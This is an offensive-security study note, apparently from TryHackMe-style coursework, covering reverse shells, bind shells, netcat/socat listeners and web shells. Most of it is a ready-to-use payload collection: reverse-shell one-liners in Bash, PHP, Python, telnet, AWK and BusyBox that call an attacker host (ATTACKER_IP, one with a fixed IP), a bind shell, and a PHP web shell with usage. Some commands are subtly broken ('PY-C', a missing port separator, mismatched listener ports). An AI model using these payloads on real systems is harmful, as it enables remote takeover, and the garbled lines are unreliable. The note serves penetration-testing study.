---
date: 2026-03-03
tags:
  - shell
  - offensive-security
  - exploitation
  - linux
---
# Reverse Shell
---
A reverse shell (AKA "connect back shell") initiates a connection from the target system to the attacker's machine.
This helps to avoid detection from network firewalls and other security appliances.

## How Reverse Shell Works
On the attacker's machine, set up a **Netcat (nc)** listener to listen for a connection.

Example Usage: 
```shell
attacker@kali:~$ nc -lvnp 443
listening on [any] 443 ...
```
- `-l` option indicate Netcat to listen or wait for a connection
- `-v` enables verbose mode
- `-n` prevents the connections from using DNS for lookup
- `-p` indicates the port that will be used to wait for the connection

**Side Note:** any port can be used, but attackers and pentesters tend to use known ports used by other applications like **53, 80, 8080, 443, 139, or 445** to blend the reverse shell with legitimate traffic.

## Gaining Reverse Shell Access
Once a listener is set, send a reverse shell payload.

Example of a **pipe reverse shell** payload:
```shell
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f
```
- `rm -f /tmp/f`: this command removes any existing named pipe file located at `/tmp/f/`. This ensures that the script can create a new named pipe without conflicts.
- `mkfifo /tmp/f`: this command creates a named pipe, or FIFO (first-in, first-out), at `/tmp/f`. Named pipes allow for two-way communication between processes. In this context, it acts as a conduit for input and output.
- `cat /tmp/f`: this command reads data from the named pipe. It waits for input that can be sent through the pipe.
- `| bash -i 2>&1`: the output of `cat` is piped to a shell instance (`bash -i`), which allows the attacker to execute commands interactively. The `2>&1` redirects standard error to standard output, ensuring that error messages are sent back to the attacker.
- `| nc ATTACKER_IP ATTACKER_PORT >/tmp/f`: this part pipes the shell's output through `nc` (Netcat) to the attacker's IP address (`ATTACKER_IP`) on the attacker's port (`ATTACKER_PORT`).
- `>/tmp/f`: this final part sends the output of the commands back into the named pipe, allowing for bi-directional communication.

# Bind Shell
---
A **bind shell** will bind to a port on the compromised system and listen for a connection.

This method is typically for when the compromised target does not allow outgoing connections.
- Though less popular method since it needs to remain active and listen for connections which can lead to detection!

## How Bind Shells Work
The attacker sets up a bind shell on the target.
Example Usage:
```shell
target@tryhackme:~$ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f
```
- `rm -f /tmp/f`: this command removes any existing named pipe file located at `/tmp/f/`. This ensures that the script can create a new named pipe without conflicts.
- `mkfifo /tmp/f`: this command creates a named pipe, or FIFO, at `/tmp/f`. Named pipes allow for two-way communication between processes. In this context, it acts as a conduit for input and output.
- `cat /tmp/f`: this command reads data from the named pipe. It waits for input that can be sent through the pipe.
- `| bash -i 2>&1`: the output of `cat` is piped to a shell instance (`bash -i`), which allows the attacker to execute commands interactively. The `2>&1` redirects standard error to standard output, ensuring error messages are returned to the attacker.
- **`| nc -l 0.0.0.0 8080`**: starts Netcat in listen mode (`-l`) on all interfaces (`0.0.0.0`) and port `8080`. The shell will be exposed to the attacker once they connect to this port.
- `>/tmp/f`: this final part sends the commands' output back into the named pipe, allowing for bidirectional communication.

## Attacker Connects to Bind Shell
Now that the target machine is waiting for incoming connections, use Netcat to connect.

Example Usage:
```shell
attacker@kali:~$ nc -nv TARGET_IP 8080 
(UNKNOWN) [TARGET_IP] 8080 (http-alt) open
target@tryhackme:~$
```
- `nc` invokes Netcat, which establishes the connection to the target.
- `-n` disables DNS resolution, allowing Netcat to operate faster and avoid unnecessary lookups.
- `-v` provides detailed output of the connection process, such as when the connection is established.
- `TARGET_IP` is the IP address of the target machine where the bind shell is running.
- `8080` is the port number on which the bind shell listens.

# Shell Listener
---
## Rlwrap
This wraps `nc` with `rlwrap`, allowing the use of features like arrow keys and history for better interaction.

Example Usage:
```shell
attacker@kali:~$ rlwrap nc -lvnp 443
listening on [any] 443 ...
```

## Ncat
An improved version of Netcat that provides extra features like encryption (SSL).

Example Usage (listening for reverse shells):
```shell
attacker@kali:~$ ncat -lvnp 4444
Ncat: Version 7.94SVN ( https://nmap.org/ncat )
Ncat: Listening on [::]:443
Ncat: Listening on 0.0.0.0:443
```

Example Usage (listening for reverse shells with SSL):
```shell
attacker@kali:~$ ncat --ssl -lvnp 4444
Ncat: Version 7.94SVN ( https://nmap.org/ncat )
Ncat: Generating a temporary 2048-bit RSA key. Use --ssl-key and --ssl-cert to use a permanent one.
Ncat: SHA-1 fingerprint: B7AC F999 7FB0 9FF9 14F5 5F12 6A17 B0DC B094 AB7F
Ncat: Listening on [::]:443
Ncat: Listening on 0.0.0.0:443
```

## Socat
This utility allows you to create a socket connection between two data sources.

Default Example Usage (listening for reverse shell):
```shell
attacker@kali:~$ socat -d -d TCP-LISTEN:443 STDOUT
2024/09/23 15:44:38 socat[41135] N listening on AF=2 0.0.0.0:443
```
- `-d` option enables verbose output; using it again increases verbosity of the commands
- `TCP-LISTEN:443` option creates a TCP istener on port 443
- `STDOUT` option directs any incoming data to the terminal

# Shell Payloads
---
## Bash
**Normal Bash Reverse Shell**
```shell
target@tryhackme:~$ bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1 
```
- `bash -i` starts Bash in interactive mode
- `/dev/tcp/ATTACKER_IP/443` is a Bash feature that creates a TCP socket connection to the attacker
- `>&` redirects stdout and stderr to the socket
- `0>&1` redirects stdin to the same socket

Explanation:
This payload launches an interactive Bash shell and redirects its input and output to a TCP connection.

This means the attacker can send commands through the socket and receive the shell output.


**Bash Read Line Reverse Shell**
```shell
target@tryhackme:~$ exec 5<>/dev/tcp/ATTACKER_IP/443; cat <&5 | while read line; do $line 2>&5 >&5; done 
```
- `exec 5<>/dev/tcp/...` opens a bidirectional TCP connection and assigns it to file descriptor 5.
- `cat <&5` reads data from that socket.
- `while read line` processes the incoming data line by line as commands.
- `$line` executes each command in the shell.
- `2>&5 >&5` redirects stdout and stderr back to the attacker through the socket.

Explanation:
This reverse shell manually processes commands received from the attacker.

Instead of attaching a shell directly to the socket, this method creates a command loop that reads commands from the network and sends the output back.


**Bash With File Descriptor 196 Reverse Shell**
```shell
target@tryhackme:~$ 0<&196;exec 196<>/dev/tcp/ATTACKER_IP/443; sh <&196 >&196 2>&196 
```
- `exec 196<>/dev/tcp/...` creates a socket connection and assigns it to file descriptor 196
- `sh <&196` sets the shell's stdin to the socket
- `>&196` redirects stdout to the socket
- `2>&196` redirects stderr to the socket

Explanation:
This payload connects a shell directly to a TCP socket using a high-numbered file descriptor.

Once executed, the shell communicates entirely through the TCP connection.
A high descriptor like 196 is used to avoid conflicts with standard descriptors.


**Bash With File Descriptor 5 Reverse Shell**
```shell
target@tryhackme:~$ bash -i 5<> /dev/tcp/ATTACKER_IP/443 0<&5 1>&5 2>&5
```
- `5<> /dev/tcp/...` creates a TCP socket and assigns it to descriptor 5.
- `0<&5` redirects stdin from the socket.
- `1>&5` redirects stdout to the socket.
- `2>&5` redirects stderr to the socket.

Explanation:
This payload opens a TCP connection on file descriptor 5 and attaches an interactive Bash shell to it.

After these redirections, Bash interacts directly with the attacker through the socket.
This is similar to the previous payload but uses descriptor 5 instead of 196.

## PHP
**PHP Reverse Shell Using the exec Function**
```shell
target@tryhackme:~$ php -r '$sock=fsockopen("ATTACKER_IP",443);exec("sh <&3 >&3 2>&3");' 
```
- `fsockopen()` creates a TCP connection to the attacker.
- The socket is assigned to file descriptor 3.
- `exec()` executes a shell command.
- `sh <&3 >&3 2>&3` redirects stdin, stdout, and stderr of the shell to the socket.
- `-r` runs the php code directly on the command line.

Explanation:
This payload uses PHP to open a network socket and attach a shell to it.
This allows the attacker to interact with the shell through the TCP connection.


**PHP Reverse Shell Using the shell_exec Function**
```shell
target@tryhackme:~$ php -r '$sock=fsockopen("ATTACKER_IP",443);shell_exec("sh <&3 >&3 2>&3");'
```
- `fsockopen()` creates the network connection.
- `shell_exec()` runs a shell command and captures its output.
- The shell's input and output streams are redirected to the socket using file descriptor 3.

Explanation:
This payload works the same way as the previous one but uses `shell_exec(`).
This enables remote command execution through the socket.


**PHP Reverse Shell Using the system Function**
```shell
target@tryhackme:~$ php -r '$sock=fsockopen("ATTACKER_IP",443);system("sh <&3 >&3 2>&3");' 
```
- `fsockopen()` creates the TCP connection.
- `system()` executes the shell command.
- The shell's input and output streams are redirected to the socket.

Explanation:
This payload uses PHP's `system()` function to run a shell attached to the network socket.
The attacker can then send commands and receive output through the connection.


**PHP Reverse Shell Using the passthru Function**
```shell
target@tryhackme:~$ php -r '$sock=fsockopen("ATTACKER_IP",443);passthru("sh <&3 >&3 2>&3");'
```
- `passthru()` executes a command and directly outputs the result.
- The shell communicates through file descriptor 3, which points to the socket created by fsockopen().

Explanation:
This payload is similar to the previous PHP reverse shells but uses `passthru()`.
This allows direct command execution and output transmission to the attacker.


**PHP Reverse Shell using the popen Function**
```shell
target@tryhackme:~$ php -r '$sock=fsockopen("ATTACKER_IP",443);popen("sh <&3 >&3 2>&3", "r");' 
```
- `fsockopen()` creates the connection to the attacker.
- `popen()` starts a process (`sh`) and opens a pipe to it.
- The shell's input and output streams are redirected to file descriptor 3, which points to the network socket.

Explanation:
This payload opens a shell process using `popen()`.
This allows the attacker to execute commands through the shell over the TCP connection.

## Python
**Python Reverse Shell by Exporting Environment Variables**
```shell
target@tryhackme:~$ export RHOST="ATTACKER_IP"; export RPORT=443; PY-C 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")' 
```
- `socket.socket()` creates a TCP socket.
- `connect()` connects to the attacker.
- `os.dup2()` duplicates the socket file descriptor onto stdin, stdout, and stderr.
- `pty.spawn("bash")` launches a Bash shell with a pseudo-terminal, making the shell behave more like a real terminal session.

Explanation:
This payload uses Python to establish a reverse shell.
Environment variables are used to store the attacker IP and port.


**Python Reverse Shell using the subprocess Module**
```shell
target@tryhackme:~$ PY-C 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.4.99.209",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")' 
```
- A socket connection is established to the attacker.
- `os.dup2()` redirects stdin, stdout, and stderr to the socket.
- `pty.spawn("bash")` launches a Bash shell with a pseudo-terminal.

Explanation:
This payload creates a reverse shell using Python's socket and OS modules.


**Short Python Reverse Shell**
```shell
PY-C 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'
```
- Creates a socket connection to the attacker.
- Redirects standard input/output/error to the socket using `dup2`.
- Spawns a Bash shell with `pty.spawn()`.

Explanation:
This is a shorter version of the previous Python reverse shell.

## Others
**Telnet**
```shell
target@tryhackme:~$ TF=$(mktemp -u); mkfifo $TF && telnet ATTACKER_IP443 0<$TF | sh 1>$TF
```
- `mkfifo` creates a pipe used for input/output exchange.
- `telnet` connects to the attacker.
- The shell reads commands from the pipe and sends output back through it.

Explanation:
This payload uses a named pipe (FIFO) to create a two-way communication channel.
The FIFO acts as a bridge between the network connection and the shell.


**AWK**
```shell
target@tryhackme:~$ awk 'BEGIN {s = "/inet/tcp/0/ATTACKER_IP/443"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```
- `/inet/tcp/0/IP/PORT` opens a TCP socket.
- The script continuously reads commands from the socket.
- Commands are executed locally and the output is sent back through the same socket.

Explanation:
This payload uses AWK’s built-in networking capabilities.
This creates a persistent reverse shell using only AWK.


**BusyBox**
```shell
target@tryhackme:~$ busybox nc ATTACKER_IP 443 -e sh
```
- `nc` connects to the attacker.
- `-e sh` instructs Netcat to execute a shell and attach it to the network connection.

Explanation:
This payload uses BusyBox’s version of Netcat.
Once connected, the attacker gains remote shell access to the system.

# Web Shell
---
A web shell is a script written in a language supported by a compromised web server that executes commands through the web server itself. A web shell is usually a file containing the code that executes commands and handles files. It can be hidden within a compromised web application or service, making it difficult to detect and very popular among attackers.

Example PHP Web Shell
```php
<?php
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
```
This shell can be saved to a file (**shell.php**) then uploaded into a web server.

After the web shell is deployed in the server, it can be accessed through the URL where the web shell is hosted, for example `http://victim.com/uploads/shell.php/`. As we observed from the code in shell.php, we need to provide a GET method and the value of the variable cmd, which should contain the command the attacker wants to execute. 

For example, if we want to execute the command whoami the request to the URL should be: `http://victim.com/uploads/shell.php?cmd=whoami`

The above will execute the command whoami and display the result in the web browser. 

# Extra Resources
---
See [Extra Shell Notes](Extra%20Shell%20Notes.md) for more information on Shells.